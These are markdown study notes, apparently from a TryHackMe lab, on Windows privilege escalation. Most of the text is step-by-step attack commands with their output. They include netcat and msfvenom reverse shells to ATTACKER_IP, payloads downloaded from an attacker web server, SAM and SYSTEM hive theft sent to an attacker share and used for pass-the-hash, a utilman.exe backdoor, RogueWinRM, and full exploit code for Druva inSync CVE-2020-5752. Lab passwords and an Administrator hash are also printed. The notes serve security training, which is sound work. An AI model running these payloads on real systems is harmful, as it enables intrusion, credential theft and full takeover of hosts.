# Windows Privilege Escalation
* Use given access to a host with "user A" to abuse a weakness to gain access to "user B" on the system.
* May have to escalate into other unprivileged users before gaining administrative privileges.
* May find credentials in unsecured text files / spreadsheets.
* May have to abuse a weakness.
  * Service / scheduled task misconfigurations.
  * Excessive account privileges.
  * Vulnerable software.
  * Missing OS security patches.
## Windows Users

| User | Privileges
| --- | ---
| Administrators | Most privileges. Can change any system configuration parameter and access any file on the system.  Will be a member of the **Administrators** group.
| Standard Users | Can only perform limited tasks. Typically cannot make permanent or essential changes to the system and are limited to their own files.  Will be part of the **Users** group.
| SYSTEM / LocalSystem | Used by the OS to perfrom internal tasks. Full access to all files and resources on the system with even higher privileges than administrators.
| Local Service | Default account used to run services with "minimum" privileges. Uses anonymous connections over the network.
| Network Service | Default account used to run services with "minimum" privileges. Uses the computer credentials to authenticate through the network.

# Harvesting Passwords from Usual spots
* Easiest way to gain access to another user is to gather credentials from a compromised machine.
## Unattended Windows Installations
* Administrators may use Windows Deployment Services (WDS) when installing Windows on a large number of hosts.
  * Single OS system image deployed to many hosts through the network.
  * AKA unattended installations.
    * Does not require user interaction.
  * Requires administrator account to perfrom initial setup.
    * Credentials may be stored on the machine.
      * `C:\Unattend.xml`
      * `C:\Windows\Panther\Unattend.xml`
      * `C:\Windows\Panther\Unattend\Unattend.xml`
      * `C:\Windows\system32\sysprep.inf`
      * `C:\Windows\system32\sysprep\sysprep.xml`
## PowerShell History
* Commands run using PowerShell are stored in a file.
* Useful for quickly repeating commands used before.
* User may include a password directly in a command.
* Retrieve history using `cmd.exe`.
```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt
```
* Retrieve history using PowerShell.
```
$ENV:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt
```
## Saved Windows Credentials
* Windows allows other credentials to be used.
* List saved credentials (cannot see passwords).
```
cmdkey /list
```
* Sample output.
```
Currently stored credentials:

    Target: Domain:interactive=WPRIVESC1\mike.katz
    Type: Domain Password
    User: WPRIVESC1\mike.katz
```
* Try any "interesting" credentials using `runas`.
```
runas /savecred /user:mike.katz cmd.exe
```
## Internet Information Services (IIS) Configuration
* Default web server on Windows.
* Configuration stored in `web.config` file.
  * This may store database passwords or configured authentication mechanisms.
* Possible `web.config` locations.
  * `C:\inetpub\wwwroot\web.config`
  * `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
* Find database connection string in the file.
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
* Sample output.
```
<add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false" bufferMode="Notification" name="SqlWebEventProvider" type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
<add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider" type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
<connectionStrings>
<add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
</connectionStrings>
```
## Retrieve Credentials from Software: PuTTY
* PuTTY is SSH client commonly found on Windows systems.
* Users can store sessions where proxy configurations may include cleartext authentication credentials.
* Retrieve stored proxy credentials from the registry.
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
* Sample output.
```
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
    ProxyExcludeList    REG_SZ
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x0
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    thom.smith
    ProxyPassword    REG_SZ    CoolPass2021
    ProxyTelnetCommand    REG_SZ    connect %host %port\n
    ProxyLogToTerm    REG_DWORD    0x1

End of search: 10 match(es) found.
```
* Any software that stores passwords (browsers, email clients, FTP clients, SSH clients VNC software) may have methods to recover passwords saved by the user.

# Other Quick Wins
* Some misconfigurations can allow higher privileged user access to be obtained.

## Scheduled Tasks
* May find a scheduled task that either lost its binary or is using a binary that can be modified.
* Use `schtasks` to list sheduled tasks.
* Detailed information can be retrieved about any of the services.
```
schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
``` 
* `Task to Run` parameter indicates what gets executed by the scheduled task.
* `Run as User` parameter shows the user that will execute the task.
* What gets executed by the "Run as User" can be controlled if current user can modify "Task to Run".
  * Results in simple privilege escalation.
* Check File permissions on executable.
```
icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```
* `(F)` means full access over the binary.
  * Can modify .bat and insert any payload.
* Change bat file to spawn reverse shell.
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
* Start listener on attacker machine.
```
nc -lvnp 4444
Listening on 0.0.0.0 4444
```
* Attacker will recieve reverse shell with taskusr1 privileges when sheduled task next runs.
* Start task manually (if current user has permissions).
```
schtasks /run /tn vulntask
```
* Attacker will immediately receive the reverse shell.
```
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```
## AlwaysInstallElevated
* Windows installer files (.msi) usually run with privilege level of user that executed it.
  * Can be configured to run with higher privileges.
* Generate malicious MSI file that runs with admin privileges.
* Requires two registry values to be set to exploit the vulnerabilty.
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
* Generate MSI reverse shell file using `msfvenom`.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.189.232 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
* Transfer malicious file to target.
* Run properly configured Metasploit handler module on attacking machine.
* Run installer on target to receive the reverse shell.
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
# Abusing Service Misconfigurations
## Windows Services
* Managed by Service Control Manager (SCM).
* Each service has associated executable run by SCM whenever service is started.
* Not any executable can be started as a service successfully.
  * Service executables implement special functions to communicate with SCM.
* Services specify the user account under which they will run.
* `sc qc` shows structure of `apphostsvc` service.
```
sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
``` 
* **BINARY_PATH_NAME** specifies associated executable.
* **SERVICE_START_NAME** species the account used to run the service.
* Services have a Discretionary Access Control List (DACL).
  * Defines who has permission to start, stop, pause, query status, query configuration, or reconfigure the service.
* DACL can be seen from Process Hacker.
* All services configurations are stored in the registry.
```
HKLM\SYSTEM\CurrentControlSet\Services\
```
* Subkey exists for each service.
  * **ImagePath** shows associated executable.
  * **ObjectName** shows account used to start the service.
  * **Security** stores DACL if configured for the service.
* Only administrators can modify these registry entries by default.

## Insecure Permissions on Service Executable
* Attacker can gain privileges of service's account trivially if service executable has insecure permsissions.
### Splinterware System Scheduler vulnerability Use Case
```
sc.exe qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```
#### 1. Check permissions on the executable.
```
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
* Everyone group has modify permissions `(M)` on executable.
* Executable can be overwritten with malicious payload.
* Service will be executed with privileges of "svcuser1" user account.
#### 2. Generate exe-service payload using `msfvenom`.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
``` 
#### 3. Serve payload through python webserver.
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
#### 4. Pull payload from PowerShell.
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
``` 
#### 5. Replace service executable with payload.
```
cd C:\PROGRA~2\SYSTEM~1\

move WService.exe WService.exe.bkp
        1 file(s) moved.

move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.
```
#### 6. Grant full permissions to Everyone group as need another user to execute payload.
```
icacls WService.exe /grant Everyone:F
```
#### 7. Start reverse listener on attacking machine.
```
nc -lvnp 4445
Listening on 0.0.0.0 4445
```
#### 8. Restart service (if current user has permissions).
* PowerShell has `sc` as an alias to `Set-Content`.
  * Need to use `sc.exe` to control services with PowerShell this way.
```
sc.exe stop windowsscheduler
sc.exe start windowsscheduler
```
#### 9. Reverse shell with "svcusr1" privileges received.
```
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```
## Unquoted Service Paths
* Used when unable to directly write into service executables.
* Very particular behaviour occurs when a service is configured to point to an "unquoted" executable.
  * Path of executable not properly quoted to account for spaces.
```
sc.exe qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```
* Spaces on name of "Disk Sorter Enterprise" folder make command ambiguous.
* SCM does not know what to execute.

| Command | Arguement 1 | Arguement 2
| --- | --- | ---
| `C:\MyPrograms\Disk.exe` | `Sorter` | `Enterprise\bin\disksrs.exe`
| `C:\MyPrograms\Disk Sorter.exe` | `Enterprise\bin\disksrs.exe` |
| `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` | |

* Spaces usually used as argument seperators unless part of quoted string.
* SCM tries to help by searching for each of the binaries in the above table order.
* Attacker creates any of the executables searched for before the expected service executable.
  * Forces service to run arbitary executable.
* Most service executables installed where unprivileged users cannot write.
  * `C:\Program Files`
  * `C:\Program Files (x86)`
* Some installers reduce permissions of installed folder.
* Administrator may install service binaries in world-writable non-default path.
### `c:\MyPrograms` Use Case.
  * Golder inherits permissions of `C:\`
  * Any user can create files and folders. 
```
icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```
* `BUILTIN\Users` group has `(AD)` (create subdirectories) and `(WD)` (create files) privileges on folder.
#### 1. Create `msfvenom` exe-service payload.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
```
#### 2. Serve payload through python webserver.
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
#### 3. Pull payload from PowerShell.
```
wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
``` 
#### 4. Start listener to receive reverse shell.
```
nc -lvnp 4446
Connection received on 10.10.175.90 50650
```
#### 5. Move payload to `c:\MyPrograms\Disk.exe`.
```
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
```
#### 6. Grant Everyone full permission on file.
  * Ensures file can be executed by the service.
```
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```
#### 7. Restart service to execute payload.
```
sc.exe stop "disk sorter enterprise"
sc.exe start "disk sorter enterprise"
```
#### 8. Reverse shell with "svcusr2" privileges received.
```
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```
## Insecure Service Permissions
* Service DACL (not service's executable DACL) allows reconfiguration of the service.
* Point service at any executable and run it with any account.
* [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from Sysinternals suite used to check for service DACL.
### "thmservice" DACL Use Case.
```
accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```
* `BUILTIN\Users` group has `SERVICE_ALL_ACCESS` permission.
   * Any user can reconfigure service.
#### 1. Build exe-service reverse shell in `msfvenom`.
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
```
#### 2. Start listener for connection on attacker's machine.
```
nc -lvnp 4447
Listening on [0.0.0.0] (family 0, port 4447)
```
#### 3. Serve payload through python webserver.
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
#### 4. Pull payload from PowerShell.
```
wget http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe
``` 
#### 5. Move payload to `C:\Users\thm-unpriv\rev-svc3.exe` if necessary.
#### 6. Grant "Everyone" permission to execute payload.
```
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```
#### 7. Change service's associated executable and account.
  * Note spaces after equal signs when using `sc`.
  * LocalSystem account chosen as it is highest privilege account available.
```
sc.exe config thmservice binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```
#### 8. Restart service to trigger payload.
```
sc.exe stop thmservice

[SC] ControlService FAILED 1062:

The service has not been started.

sc.exe start thmservice

SERVICE_NAME: thmservice
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3328
        FLAGS              :
```
#### 9. Shell recieved back to attacker with SYSTEM privileges.
```
Connection from 10.10.29.166 49894 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
# Abusing Dangerous Privileges
## Windows Privileges
* `whoami /priv` checks user's assigned privileges.
* [Full list of available Windows privileges](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
* Comprehensive list of exploitable privileges on [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.
## SeBackup / SeRestore Privileges
* Allows users to read and write to any file in the system.
  * Ignores any DACL in place.
* Rationale is to allow certain users to perform backups without requiring full admin rights.
* Attacker can trivially escalate privileges with these privileges.
### Copy SAM and SYSTEM registry hives to extract Administrator's password hash Use Case
#### 1. RDP to target.
```
xfreerdp /u:THMBackup /p:CopyMaster555 /v:10.10.21.86
```
* "THMBackup" is member of "Backup Operators" group.
  * Granted SeBackup and SeRestore privileges.
#### 2. Open command prompt using "Open as administrator" to use the elevated privileges.
* Check account's privileges.
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
#### 3. Backup SAM and SYSTEM hashes.
```
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```
#### 4. Copy files to attacker machine.
* Use impacket's `smbserver.py` to start SMB server with a network share.
```
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```
  * Creates share named `public` pointing to 'share' directory.
  * Directory requires credentials of current Windows session.
* Transfer both files from target to attacking machine.
```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
#### 5. Use impacket to retrieve users' password hashes.
```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
```
#### 6. Perform Pass-the-Hash attack to gain access to target with SYSTEM privileges.
```
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.21.86
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Requesting shares on 10.10.21.86.....
[*] Found writable share ADMIN$
[*] Uploading file uoQARDky.exe
[*] Opening SVCManager on 10.10.21.86.....
[*] Creating service jeuG on 10.10.21.86.....
[*] Starting service jeuG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
nt authority\system
```
## SeTakeOwnership Privilege
* Allows user to take ownership of any object on a system.
* Opens up many possibilities for an attacker to elevate privileges.
  * E.g. Take ownership of a service's executable that is running as SYSTEM.
### Abuse `utilman.exe` to escalate privileges Use Case
* Utilman is built-in Window app used to provide Ease of Access options during lock screen.
* Runs with SYSTEM privileges.
#### 1. RDP to target machine.
```
xfreerdp /u:THMTakeOwnership /P:TheWorldIsMine2022 /v:10.10.33.51
```
#### 2. Open command prompt using "Open as administrator" to get the SeTakeOwnership privilege.
* Check privileges.
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
``` 
#### 3. Take ownership of utilman.
```
takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership"
```
#### 4. Assign owner account full privileges on file.
```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```
#### 5. Replace utilman.exe with copy of cmd.exe.
```
cd c:\Windows\System32\
copy utilman.exe %temp%
        1 file(s) copied.
copy cmd.exe utilman.exe
Overwrite Utilman.exe (Yes/No/All): yes
        1 file(s) copied.
```
#### 6. Trigger utilman by locking screen.
* Click on "Ease of Access" button.
* Runs cmd.exe with SYSTEM privileges.
```
The system cannot find message text for message number 0x2350 in the message file for Application.

(c) 2018 Microsoft Corporation. All rights reserved.
Not enough memory resources are available to process this command.

C:\Windows\system32>whoami
nt authority\system
```
## SeImpersonate / SeAssignPrimaryToken Privileges
* Allow a process to impersonate users and act on their behalf.
  * E.g. spawn a process or thread under the security context of another user.
### FTP Use Case
1. FTP service running with user "ftp".
2. User "Ann" logs onto the FTP server to access their files.
3. FTP service tries to access the files using its access token rather than Ann's
#### Without SeImpersonate / SeAssignPrimaryToken Privileges
* All files would need to be accessible to "ftp" user.
* Must manually configure specific permissions for each served file/directory.
  * Impossible to delegate authorisation to OS as all files are accessed by "ftp" user.
  * FTP service must implement this instead.
* Attacker would gain access to all folders if FTP service were compromised.
#### With SeImpersonate / SeAssignPrimaryToken Privileges
* FTP service can temporarily grab access token of user logging in if SeImpersonate or SeAssignPrimaryToken priveleges are applied.
  * Use token to perform FTP tasks on behalf of the user.
* Files do not need to provide access to "ftp" user.
* OS handles authorisation.
  
*  Attacker can impersonate any user connecting and authenticating to that process if they can take control of a process with SeImpersonate or SeAssignPrimaryToken Privileges.
  *  `LOCAL SERVICE` and `NETWORK SERVICE` accounts already have these privileges.
     *  Used to spawn services using restricted accounts.
     *  Logical for them to impersonate connecting users.
  *  IIS creates similar default account `iis apppool\defaultapppool` for web apps.
## RogueWinRM Exploit Use Case
* Exploit is possible because whenever a user starts the BITS service it automatically creates a connection to TCP/5985 using SYSTEM privileges.
  * TCP/5985 typically used by WinRM service.
  * Port exposes PowerShell console to be used remotely.
    * SSH but usaing PowerShell.
* Attacker can start fake WinRM service if WinRm is not running on target.
* Fake service catches SYSTEM authentication attempt made by BITS service.
* Attacker can execute any command if they have SeImpersonate privileges.  
* Assume that IIS website has already been compromised and a web shell has been planted on `https://10.10.33.51`.
### 1. Use web shell to check assigned permissions of compromised account include SeImpersonate and SeAssignPrimaryToken.
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
#### 2. Upload "RogueWinRM" exploit to target.
* Already uploaded to `C:\tools` folder.
#### 3. Start Netcat Listener to receive reverse shell.
```
nc -lvnp 4442
```
#### 4. Use web shell to trigger RogueWinRM exploit.
* Exploit may take up to two minutes to work as BITS service stops after two minutes of starting.
```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```
* `-p` specifies executable to be run.
  * `nc64.exe`
* `-a` used to pass arguements to executable.
  * `-e cmd.exe ATTACKER_IP 4442`
  * Establish a reverse shell against attacker machine.
#### 5. Shell created with SYSTEM privileges.
```
Connection from 10.10.33.51 49899 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
# Abusing Vulnerable Software
## Unpatched Software
* Can present various privilege escalation opportunities.
* `wmic` lists installed software.
  * May not return all installed programs.
```
wmic product get name.version,vendor
```
* Search for existing exploits on installed software.
  * [exploit-db](https://www.exploit-db.com/).
  * [packet storm](https://packetstormsecurity.com/).
### Druva inSync 6.6.3 Case Study
* Target is vulnerable as it runs Remote Procedure Call (RPC) server on TCP/6064 with SYSTEM privileges from localhost only.
  * RPC is mechanism that allows a process to expose functions (procedures) over a network allowing other machines to call them.
* Druva InSync exposed a procedure that allows anyone to request execution of any command.
* Understand how to talk to TCP/6064.
1. Hello Packet -> RPC server.
   * `inSync PHC RPCW[v0002]`
   * Packet contains a fixed string.
3. Remote Procedure ID -> RPC Server.
   * `0x00000005`
   * Execute vulnerable procedure 5.
4. Command Length -> RPC Server.
   * `62`
   * Set length of command.
6. Command String -> RPC Server.
   * `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe`
   * Set command string to be executed.
* Original exploit published [here](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html).
#### 1. Execute Exploit in PowerShell Concsole.
* Full exploit code.
```
# Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)
# Date: 2020-12-03
# Exploit Author: 1F98D
# Original Author: Matteo Malvica
# Vendor Homepage: druva.com
# Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi
# Version: 6.6.3
# Tested on: Windows 10 (x64)
# CVE: CVE-2020-5752
# References: https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/
# Druva inSync exposes an RPC service which is vulnerable to a command injection attack.

$ErrorActionPreference = "Stop"

$cmd = "net user pwnd1 SimplePass123 /add & net localgroup administrators pwnd1 /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
* Default payload creates user called `pwnd` but does not assign administrative privileges.
* Change payload to add created user to administrators group.
```
$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
```
#### 2. Verify that `pwnd` user exists and is member of administrators group.
```
net user pwnd
User name                    pwnd
Full Name
Account active               Yes
[...]

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
```
#### 3. Run command prompt as administrator.
  * Use `pwnd` credentials.
# Tools of the Trade
* Scripts exist to shorten enumeration process times and uncover different potential privilege escalation vectors.
* Automated tools can sometimes miss privilege escalation.
## [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
* Script developed to enumerate target and uncover privelege escalation paths.
* Download as precompiled executable or .bat script to target.
* Redirect output to a file as output can be lengthy and difficult to read.
```
winpeas.exe > outputfile.txt
```
## [PrivescCheck](https://github.com/itm4n/PrivescCheck)
* PowerShell script that searches common privilege escaltion on target.
  * Does not require execution of binary file on target.
* Need to bypass execution policy restrictions on target to run PrivescCheck.
```
Set-ExecutionPolicy Bypass -Scope process -Force
 .\PrivescCheck.ps1
Invoke-PrivescCheck
```
## [WES-NG: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
* Python script.
* Runs on attacking machine to avoid making unnecessary noise on target that can attract attention.
* Install WES-NG.
```
git clone https://github.com/bitsadmin/wesng --depth 1
```
* Obtain latest database of vulnerabilities.
  * Database used to check for missing patches that can result in vulnerabilities allowing elevation of privileges on target.
```
wes.py --update
```
* Use Windows `systeminfo.exe` on target to check for missing patches.
* Redirect systeminfo output to file.
```
systeminfo > systeminfo.txt
```
* Copy systeminfo.txt to attacker machine.
#### Set up VSFTPD to transfer file from target.
1. `sudo apt update` to update Kali repositories.
2. `sudo apt install vsftpd` to install package.
3. `sudo systemctl start vsftpd.service` to load service.
4. `sudo systemctl status vsftpd.service` to verify it is running.
5. `sudo vim /etc/vsftp.conf` to open service's config file.
  6. `i` to enter insert mode. 
  7. Delete comment hash from "write_enable=YES" to enable file upload option.
  8. `Esc` to exit insert mode.
  9. `:wq` to save and close config file.
10. `sudo systemctl restart vsftpd.service` to restart service.
11. `sudo systemctl status vsftpd.service` to verify service is running.
12. `sudo ifconfig` to identify IP address of FTP server (10.10.58.23).
13. Go to Windows target.
14. Open File Explorer.
15. Type `ftp://ATTACKER_IP/ in navigation bar.
16. Insert Kali credentials.
17. Kali files and folders visible in Windows File Explorer.
* Execute WES-NG.
```
wes.py systeminfo.txt
```
## Metasploit
* Module lists vulnerabilities that may affect target and allow elevation of privileges.
```
multi/recon/local_exploit_suggester
```
# Conclusion
* Additional Windows privilege escalation resources.
  * [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
  * [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
  * [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
  * [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
  * [Decoder's Blog](https://decoder.cloud/)
  * [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
